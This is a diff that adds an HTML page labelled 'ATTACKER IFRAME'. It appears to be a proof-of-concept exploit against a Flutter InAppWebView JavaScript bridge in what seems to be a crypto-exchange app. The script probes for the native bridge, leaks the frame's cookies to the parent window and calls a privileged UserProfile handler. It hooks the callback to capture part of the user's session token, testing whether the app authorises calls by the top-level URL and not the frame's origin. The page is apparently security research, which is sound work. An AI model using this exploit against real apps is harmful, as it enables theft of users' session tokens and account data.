@@ -1,0 +1,26 @@
+<!doctype html><meta charset=utf-8><body style="background:#fee;font:11px monospace">
+<b>ATTACKER IFRAME</b> (origin: <span id=o></span>)
+<script>
+document.getElementById('o').textContent = location.origin;
+function report(s){ try{ parent.postMessage("IFRAME|"+s, "*"); }catch(e){} }
+report("origin=" + location.origin);
+report("fliwv=" + (typeof window.flutter_inappwebview));
+report("callHandler=" + (window.flutter_inappwebview && typeof window.flutter_inappwebview.callHandler));
+report("bridgeObj=" + (typeof window._b_bridge_UserProfile_));
+report("cookie=" + (document.cookie || "(empty)"));
+// The decisive call: does the Dart side authorise on the TOP-LEVEL url (bybit.com)
+// rather than on this frame's origin?
+window._b_bridge_callback_ = function (o) {
+  try { var d = (typeof o === "string") ? JSON.parse(o) : o;
+        report("CALLBACK " + d.moduleName + "." + d.methodName +
+               " token=" + (d.params && d.params.userToken ? d.params.userToken.slice(0,40)+"..." : "none")); }
+  catch (e) { report("cb-err " + e); }
+};
+window.invokeCallback = window._b_bridge_callback_;
+try {
+  window.flutter_inappwebview.callHandler("_b_bridge_UserProfile_", JSON.stringify({
+    moduleName:"UserProfile", methodName:"getUserProfile", uniqueId:"frame1", params:{}
+  })).then(function(r){ report("promise=" + JSON.stringify(r).slice(0,200)); })
+     .catch(function(e){ report("promise-err=" + e); });
+} catch (e) { report("THROW " + e); }
+</script></body>
